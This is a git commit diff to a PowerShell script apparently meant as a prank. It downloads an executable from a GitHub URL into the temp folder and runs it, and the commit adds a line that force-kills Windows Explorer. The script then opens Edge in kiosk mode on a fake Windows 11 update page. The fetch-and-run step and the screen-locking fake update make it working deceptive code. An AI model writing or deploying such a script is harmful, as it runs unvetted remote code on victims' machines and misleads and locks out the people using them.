ae9366371b48d798b05555f620ba31b2024df8ab
Cancarutu2012 <materadetzky2012@gmail.com>
2026-04-18 18:54:28 +0200

    Update fakeupd.ps1

--- fakeupd.ps1
+++ fakeupd.ps1
@@ -1,5 +1,5 @@
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Cancarutu2012/rroll/refs/heads/main/buttery-taskbar.exe' -OutFile '$env:TEMP\test.exe'; Start-Process '$env:TEMP\test.exe'"
-
+Stop-Process -Name explorer -Force
 Start-Process "msedge.exe" -ArgumentList "--kiosk https://fakeupdate.net/win11/"
 
 
